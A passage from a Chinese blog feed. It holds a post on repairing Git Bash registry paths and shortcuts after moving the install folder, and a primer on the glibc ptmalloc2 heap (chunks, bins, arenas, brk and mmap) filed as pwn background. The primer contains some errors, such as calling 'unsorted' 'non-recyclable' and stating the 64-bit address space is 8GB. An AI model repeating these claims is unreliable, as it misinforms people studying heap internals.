    <content type="html"><![CDATA[<p>修改程序路径后需要进行的一些操作 </p><span id="more"></span><h2 id="更改Git目录后，鼠标右键点击Git-Bash-Here出现找不到应用程序及图标变灰"><a href="#更改Git目录后，鼠标右键点击Git-Bash-Here出现找不到应用程序及图标变灰" class="headerlink" title="更改Git目录后，鼠标右键点击Git Bash Here出现找不到应用程序及图标变灰"></a>更改Git目录后，鼠标右键点击Git Bash Here出现找不到应用程序及图标变灰</h2><p>我刚放假的时候整理了自己的文件们，就把 git 的安装目录改了，我想要用 git 传大文件上 github 就出现了如题所见的问题</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_11-38-05.png"></p><p>在这里点击的时候打不开，只有手动打开 Git 才会弹出弹窗</p><p>这是因为注册表没有修改</p><p>win+R，输入 regedit 打开注册表</p><p>Ctrl+F 查找目录 HKEY_CLASSES_ROOT\ Directory \ Background \ shell \</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_12-02-51.png"></p><p>就会发现注册表中的地址还是原来的地址，修改为移动后的地址即可</p><p>还有下面的shell文件夹中找到git相关的部分也需要修改，在git_gui主目录点一次，commd单独再点开。总共需要修改八处。</p><p>修改后就可以啦</p><h2 id="修改程序路径后，程序仍可使用但图标消失或变成白块"><a href="#修改程序路径后，程序仍可使用但图标消失或变成白块" class="headerlink" title="修改程序路径后，程序仍可使用但图标消失或变成白块"></a>修改程序路径后，程序仍可使用但图标消失或变成白块</h2><p>以Git Bash为例</p><p>这是因为我们点击的图案和搜索或是导航栏中显示的图标都是”快捷方式“，而它对应的路径没有修改</p><p>找到桌面或者开始菜单下找到 Git Bash 快捷方式，右键查看属性就会发现在属性中，”目标“栏里还是之前的路径，我们修改它到移动后的路径即可。</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_11-47-13.png"></p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆概述</title>
    <link href="/2023/07/19/%E5%A0%86%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/07/19/%E5%A0%86%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<p>堆的一些基础知识🤪</p><span id="more"></span><h1 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h1><p>堆实际上就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向生长。在程序运行的过程中，堆可以提供动态分配的内存，允许申请大小未知的内存。</p><p>你可以把它看成一个结构体数组，数组里每个元素都会开辟一块内存来存储数据，这块用来存储数据的内存就是堆。结构体数组在BSS段上，其内容就是堆的地址，也就是堆的指针。</p><p>总的来说，和堆有关的部分被划分为了2块，即管理区块和数据存放区块。数据存放区块就是堆，管理区块可以对堆增删改查，也就是堆管理器。</p><p>我们一般称管理堆的那部分程序为堆管理器。堆管理器处于用户程序与内核中间，主要做以下工作：</p><ul><li><p>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。</p><p>为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，由内存管理器来通过过某种算法管理这块内存。只有这块堆空间不足时，堆管理器才会再次与操作系统进行交互。</p></li><li><p>管理用户所释放的内存。</p><p>用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</p></li></ul><blockquote><p>当前 Linux 使用的堆分配器被称为 ptmalloc2，在 glibc 中实现。</p></blockquote><p>需要注意的是，Linux系统中，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 也就是说虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p><h1 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h1><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">heap   <span class="hljs-comment">#查看堆块</span><br>bin    <span class="hljs-comment">#查看bin区块</span><br>p &amp;__free_hook <span class="hljs-comment">#查看某个函数的真实地址</span><br>p *__free_hook <span class="hljs-comment">#查看某个函数的指向</span><br>x/xxgx 0xxxx <span class="hljs-comment">#查看某个地址的内存</span><br>vmmap<br></code></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><code>malloc()</code> 是动态内存分配函数。它接收一个参数，即所需分配的内存大小（以字节为单位），并返回指向分配内存起始位置的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li>如果 <em>size</em> &#x3D;0，将返回当前系统允许的堆的最小内存块（最小值 min 为0x20）</li><li>如果 <em>size</em> 为负数，由于大部分的系统上 <em>size_t</em> 都是无符号数，所以程序就会分配很大的一块内从空间，但因为系统没有那么多的内存可以分配，通常都会分配失败。</li><li>如果 malloc() 分配失败，返回的指针将为 NULL。</li></ul><blockquote><p>malloc() 分配的内存空间在使用完后需要手动释放，否则可能导致内存泄漏。</p></blockquote><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><code>free()</code> 是动态内存分配函数。它接受一个参数，即要释放的内存块的起始地址，此函数没有返回值。需要释放的内存空间可能由 <code>malloc()</code>、<code>calloc()</code> 或 <code>realloc() </code> 分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>;<br></code></pre></td></tr></table></figure><ul><li>当P为空指针，函数并不会执行任何操作</li><li>当 p 已经被释放之后，再次释放会出现 <code>double free </code> 错误 </li><li>除了被禁用 (mallopt) 的情况，如果是释放一块很大的内存空间，程序会将这块内存空间还给系统，以便减小程序所使用的内存空间。</li></ul><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc2 内部用 <code>malloc_chunk</code> 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p><p>无论chunk的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。但是根据是否被释放，不同的chunk的表现形式会有所不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">struck malloc_chunk&#123;<br>    INTERNAL_SIZE_T prev_size;<br>    INTERNAL_SIZE_T size;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><strong>prev_size</strong> ：记录前一个较低地址的空闲的 chunk 的大小（包括chunk头）</p><p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用，并将其用于扩展当前内存块的可用空间。这就是 chunk 中的空间复用。</p></li><li><p><strong>size</strong> ：记录的是当前 chunk 的大小，且 <strong>size 的大小必须是 2 * SIZE_SZ 的整数倍</strong>（32 位系统中，<em>SIZE_SZ</em> 是 4；64 位系统中，<em>SIZE_SZ</em> 是 8）。</p><p>如果申请的内存大小不是 <code>2 * SIZE_SZ</code> 的整数倍，会被转换满足大小的最小的 <code>2 * SIZE_SZ</code> 的倍数。</p><p>该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示：</p><ul><li><p><strong>NON_MAIN_ARENA</strong>：记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于</p></li><li><p><strong>IS_MAPPED</strong>：记录当前 chunk 是否是由 mmap 分配的。</p></li><li><p><strong>PREV_INUSE</strong>：记录前一个 chunk 块是否被分配。</p><p>一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 <em>prev_size</em> 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p></li></ul></li></ul><blockquote><p>物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p></blockquote><ul><li><p><strong>fd，bk</strong> ：两个指针变量，用于构建双向链表，只有 chunk 空闲时才会被使用。</p><p>堆管理器会将其添加到适当的空闲内存块链表中统一管理。在链表中，每个空闲内存块都会有指向前一个内存块和后一个内存块的指针。</p><ul><li><strong>fd</strong> ：指向下一个（非物理相邻）空闲的 chunk</li><li><strong>bk</strong> ：指向上一个（非物理相邻）空闲的 chunk</li></ul></li><li><p><strong>fd_nextsize， bk_nextsize</strong> ：两个指针变量，和 fd，bk 作用相同，用于较大的 chunk （large chunk）。</p><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</p><ul><li><p><strong>fd_nextsize</strong> ：指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p></li><li><p><strong>bk_nextsize</strong> ：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p></li></ul></li></ul><blockquote><p>如果一个 chunk 处于 free 状态，会有两个位置记录其相应的大小：本身的 size 字段和它后一个 chunk 的 prev_size 字段。</p></blockquote><p>已经被分配的chunk结构如下，我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，也就是 mem 其实指向 user data 的起始处（这才是用户真正申请到的可利用内存）：</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/usechunk.png"></p><p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下：<br><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/freechunk.png"></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>用户释放掉的 chunk 不会马上归还给系统，而是由堆管理器统一管理 heap 和 mmap 映射区域中的空闲的 chunk。空闲的 chunk 我们称之为 bin 。</p><p>在实际的实现中，堆管理器采用分箱式方法对空闲的 chunk 进行管理。根据大小将 bin 分为4类：fast bin , small bin , large bin , unsorted bin。在此基础上，每一类 bin 当中内存大小相似的会由双向链表链接，也就是说每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk 。</p><p>对于 small bins，large bins，unsorted bins 来说，ptmalloc 将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS 128</span><br>mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];<br></code></pre></td></tr></table></figure><p><code>bins</code> 主要用于索引不同 bin 的 fd 和 bk。以 32 位系统为例，bins 前 4 项的含义如下：</p><table><thead><tr><th>下标</th><th>0</th><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>含义</td><td>bin1 的 fd&#x2F;bin2 的 prev_size</td><td>bin1 的 bk&#x2F;bin2 的 size</td><td>bin2 的 fd&#x2F;bin3 的 prev_size</td><td>bin2 的 bk&#x2F;bin3 的 size</td></tr></tbody></table><p>可以看到，bin2 的 prev_size、size 和 bin1 的 fd、bk 是重合的。由于我们只会使用 fd 和 bk 来索引链表，所以该重合部分的数据其实记录的是 bin1 的 fd、bk。虽然后一个 bin 和前一个 bin 共用部分数据，但是其实记录的仍然是前一个 bin 的链表数据。通过这样的复用，可以节省空间。</p><p>数组中的 bin 依次如下：</p><ul><li>第一个是 <strong>unsorted bins</strong>，这里面的bin都没有进行排序，相对杂乱</li><li>索引从 2 到 63 的 bin 称为 <strong>small bin</strong>s。同一个链表中的 chunk 大小相等，两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 2 个机器字长，即 32 位相差 8 字节，64 位相差 16 字节。</li><li>small bins 后面的 bin 被称作 <strong>large bins</strong>。large bin 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li></ul><h5 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h5><p>有很多的程序都会申请以及释放一些小内存块，如果小内存块释放以后存在与之相邻的空闲的 chunk ，我们将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要再次对 chunk 进行分割，这样就大大降低了堆的利用效率。</p><p>为了解决这个问题，ptmalloc 中专门设计了 <code>fast bin</code>，顾名思义它用来快速分配内存。</p><p>当用户需要的 chunk 的大小小于 fastbin 的最大值时， 堆管理器会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，堆管理器才会进行接下来的一系列操作。</p><blockquote><p>在32位系统中，系统默认的 fast bin 大小为 64 字节，但实际上它可以处理最大 80 字节的数据空间。除此之外，fast bin 可以支持的 bin 的个数为10个，从数据空间为 8 字节开始一直到 80 字节。</p></blockquote><p>fast bins 的特点：</p><ul><li><p>采用<strong>单向链表</strong>对其中的每个 bin 进行组织</p></li><li><p>每个 bin 采取 LIFO 策略，也就是<strong>后进先出</strong>的方式，最近释放的 chunk 会更早地被分配。</p></li></ul><h5 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h5><p>small bins 就是 small chunk，当中每个 chunk 的大小与其所在的 bin 的 index 的关系为：<code>chunk_size = 2 * SIZE_SZ *index</code>，具体如下：</p><table><thead><tr><th>下标</th><th>2</th><th>3</th><th>4</th><th>5</th><th>x</th><th>63</th></tr></thead><tbody><tr><td>SIZE_SZ&#x3D;4（32 位）</td><td>16</td><td>24</td><td>32</td><td>40</td><td>2*4*x</td><td>504</td></tr><tr><td>SIZE_SZ&#x3D;8（64 位）</td><td>32</td><td>48</td><td>64</td><td>80</td><td>2*8*x</td><td>1008</td></tr></tbody></table><p>small bins 的特点：</p><ul><li>采用<strong>双向链表</strong>对 bin 进行管理。每个链表都有链表头结点，且每个链表中存储的 chunk 大小都一致。</li><li>每个 bin 对应的链表采用 FIFO 的规则，也就是<strong>先进先出</strong>，所以同一个链表中先被释放的 chunk 会先被分配出去。</li></ul><h5 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h5><p>large bins 是用于管理较大内存块的数据结构。</p><p>和small bins相同，large bins采用<strong>双向链表</strong>进行管理，同时采用采用 FIFO 的规则。</p><h5 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h5><p>unsorted bin 是用于管理未分类的空闲内存块的数据结构。当一个内存块被释放时，堆内存管理器会将其添加到 unsorted bin 中，而不是直接合并到其他特定大小范围的 bin 中。</p><p>unsorted 的字面意思就是” 不可回收” 的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个” 垃圾桶” 中。</p><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。</p><p>其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk 。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。</p><p>需要注意的是，top chunk 的 <em>prev_inuse</em> 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p><h3 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h3><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，由 unsorted bin 进行存储。</p><p>需要注意的是 top chunk 分割剩下的部分不会作为 last remainder。</p><h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena 是指一块用于管理和分配内存的区域，是内存池的一种。它是堆内存管理的一种组织方式，每个 arena 都是一个独立的内存区域，用于管理特定范围内的内存块。默认情况下，glibc 为每个线程分配一个 arena，以减少不同线程之间的竞争和锁冲突。</p><blockquote><p>main_arena 并不在申请的 heap 中，而是一个全局变量，在 libc.so 的数据段。</p></blockquote><p>需要注意的是，并不是每一个线程都有对应的 arena（使用了系统级的内存分配方式如 mmap() 等，线程可能会绕过 glibc 的内存分配机制，因此没有与 glibc 相关联的 arena；除此之外也可以手动设置限制线程的 arena 创建数量）。</p><h5 id="分配规则"><a href="#分配规则" class="headerlink" title="分配规则"></a>分配规则</h5><ul><li><p><code>arena</code>: 有一个 main_arena ，是由主线程创建的，thread_arena 则为各线程创建的，当 arena 满了之后就不再创建而是与其他 arena 共享一个 arena，方法为依次给各个 arena 上锁（查看是否有其他线程正在使用该arena），如果上锁成功（没有其他线程正在使用），则使用该 arena ，之后一直使用这个 arena ，如果无法使用则阻塞等待。</p></li><li><p><code>heap</code>：等级比arena要低一些，一个 arena 可以有多个 heap，也是存储了堆相关的信息。</p></li><li><p><code>chunk</code>：分配给用户的内存的一个单位，每当我们分配一段内存的时候其实就是分配得到了一个 chunk ，我们就可以在 chunk 当中进行一定的操作了。不过为了进行动态分配，chunk 本身也有一些数据（元数据），是用来指示其分配等等的数据。</p></li></ul><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>当程序刚刚开始运行时，每一个线程是没有自己的 heap 区域的，需要程序主动申请内存。当程序使用完了这个  heap 的资源，就必须要再次申请，并且一般情况下申请的 heap 是不连续的。我们就需要 heap_info这个数据结构来记录不同 heap 之间的链接关系。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr;                 <span class="hljs-comment">//对应的arena的地址               </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span>       <span class="hljs-comment">//上一个 heap_info 的地址   </span><br>  <span class="hljs-type">size_t</span> size;                   <span class="hljs-comment">//当前堆的大小        </span><br>  <span class="hljs-type">size_t</span> mprotect_size;          <span class="hljs-comment">//堆实际使用的内存大小</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; <span class="hljs-comment">//填充字段，用于对齐 _heap_info 结构体的大小</span><br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p>特点：</p><ul><li>使用单向链表进行链接</li><li>需要确保 <code>MALLOC_ALIGN_MASK+1</code> 对齐，所以可能会用到 <em>pad</em>，</li></ul><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>malloc_state 结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。</p><blockquote><p>由于 thread 的 arena 可能有多个，所以它的 malloc state 结构会在最新申请的 arena 中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br>    __libc_lock_define(, mutex);            <span class="hljs-comment">//用于控制程序串行访问同一个分配区,实现访问的互斥锁。</span><br>    <span class="hljs-type">int</span> flags;                              <span class="hljs-comment">//标志位，用于记录一些状态信息</span><br>    mfastbinptr fastbinsY[ NFASTBINS ];     <span class="hljs-comment">//fastbin 的空闲块链表,存放每个 fast chunk 链表头部的指针</span><br>    mchunkptr top;<span class="hljs-comment">//最顶部的内存块，用于指示当前可用的内存位置</span><br>    mchunkptr last_remainder;               <span class="hljs-comment">//最近一次分割的小块内存请求剩余部分的内存块</span><br>    mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];        <span class="hljs-comment">//用于存储 unstored bin，small bins 和 large bins 的 chunk 链表</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[ BINMAPSIZE ];      <span class="hljs-comment">//标识某一个 bin 中是否包含空闲 chunk</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span>              <span class="hljs-comment">//指向下一个 arena 的指针，形成了一个链表结构</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span>         <span class="hljs-comment">//指向下一个空闲的 arena 的指针，形成了一个链表结构。</span><br>    INTERNAL_SIZE_T attached_threads;       <span class="hljs-comment">//附加到此 arena 的线程数量</span><br>    INTERNAL_SIZE_T system_mem;             <span class="hljs-comment">//在该 arena 中从系统分配的内存总量</span><br>    INTERNAL_SIZE_T max_system_mem;         <span class="hljs-comment">//在该 arena 中从系统分配的内存的最大值</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>要注意的是，main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段。</strong></p><h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2><p>我们在程序代码中使用 malloc 函数和 free 函数来申请和分配内存。但实际上与系统交互的并不是这两个函数而是</p><p><code>(s)brk</code> 函数以及 <code>mmap</code> 函数，它们之间的关系如下：</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/malloc_sys.png"></p><p>具体的结构如下图（和网上的那些图一样，我重做一张图是因为网上的都是英文，我的英语水平不高看不懂😅）：</p><blockquote><p>要注意的是，并不是所有的 ”堆“ 都在 Heap 区域，mmap 对应 <code>Memory Mapping Segment</code> ，brk 才是对应 <code>Heap</code> 的。</p><p>下图为32位程序的虚拟内存结构，64位的虚拟地址大小为8GB，但结构大致相同。</p></blockquote><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/stack_heap.png"></p><p>如上图，我们的 malloc 函数是在用户空间对应的 0~3G 的内存进行操作，但用户空间的代码不能直接访问内核空间，因此需要借用 sbrk() 等系统函数充当与内核之间的接口。当然我们也可以直接在用户空间的代码中使用系统调用，进而越过接口直接与系统内核交互，也能达到同样的效果（但是系统调用的效率会相对较低）。</p><p><code>brk</code> 适用于小块内存的分配和释放，而 <code>mmap</code> 适用于大块内存的分配和一些特殊需求（例如映射文件到内存），接下来会进行详细的分析。</p><p>我们主要来分析申请堆块的操作</p><h4 id="brk-与-sbrk"><a href="#brk-与-sbrk" class="headerlink" title="brk 与 sbrk"></a>brk 与 sbrk</h4><p>这两个函数都是通过改变 peogram break （程序中断点）的位置来改变数据段长度，进而实现虚拟内存到物理内存的映射。</p><h5 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h5><p> <code>brk</code> 通过修改数据段的末尾地址实现内存的分配与回收。它的原型为  <code>void *brk(void *addr);</code> ，其中参数 <em>addr</em> 是新的 Heap 段结束地址。调用 <code>brk</code> 后，操作系统将 Heap 段的结束地址设置为 <em>addr</em>，并将 Heap 段扩展或缩小至新的结束地址。</p><p>初始时，堆段的起始地址 <em>start_brk</em> 以及结束位置 <em>brk</em> 指向同一位置，根据程序是否开启了 ASLR保护，位置会有所不同 ：</p><ul><li>不开 ASLR 保护时， <em>start_brk</em> 以及 <em>brk</em> 会指向 data&#x2F;bss 段的结尾；</li><li>开启 ASLR 保护时，<em>start_brk</em> 以及 <em>brk</em> 会指向 data&#x2F;bss 段后的随机偏移处（两个指针仍指向同一处）</li></ul><h5 id="sbrk"><a href="#sbrk" class="headerlink" title="sbrk"></a>sbrk</h5><p><code>sbrk  </code> 通过控制间断点向前或向后移动指定长度字节来实现内存的分配与回收。它的原型为 <code>void *sbrk(intptr_t increment);</code>，其中参数 <em>increment</em> 是需要增加或减小的字节数，根据 <em>increment</em> 数值的不同，对应的变化也不相同：</p><ul><li>当 <em>increment</em> 为正数时，peogram break 会向高地址移动相应的字节数，同样堆的大小会增加相应的字节数，相当于申请内存；</li><li>当 <em>increment</em> 为负数时，peogram break 会向低地址移动相应的字节数，同样堆的大小会减小相应的字节数，相当于释放内存；</li><li>当 <em>increment</em> 为 0 时，peogram break 不移动位置，同样函数只返回当前位置。</li></ul><h4 id="mmap-与-munmap"><a href="#mmap-与-munmap" class="headerlink" title="mmap 与 munmap"></a>mmap 与 munmap</h4><p><code>mmap</code> 函数是一种内存映射文件的方法，将文件或者其他对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中的某一段虚拟地址的一一对应关系。</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/mmap.png"></p><p>映射关系一旦建立，就可以直接再内存中对映射的文件进行读写，对应的操作会直接反映在映射的文件上，不用再借用系统调用函数了。</p><p><code>mmap</code> 的函数原型是 <code>void * mmap(void * addr, size_t length,int prot,int flags,int fd,off_t offset);</code> ，其中 <em>length</em> 是指定的映射长度，它并没有严格要求必须填入操作系统分页大小的整数倍，但是操作系统会自动向上取整，确保映射的长度满足对其要求。</p><p><code>munmap</code> 函数用于解除映射关系，其函数原型为 <code>int munmap(void * addr, size_t length);</code> ，<em>addr</em> 为函数返回接收的地址，<em>length</em> 为请求分配的长度。</p><hr><p>未完待续🤗</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串进阶版</title>
    <link href="/2023/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/"/>
    <url>/2023/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/</url>
    
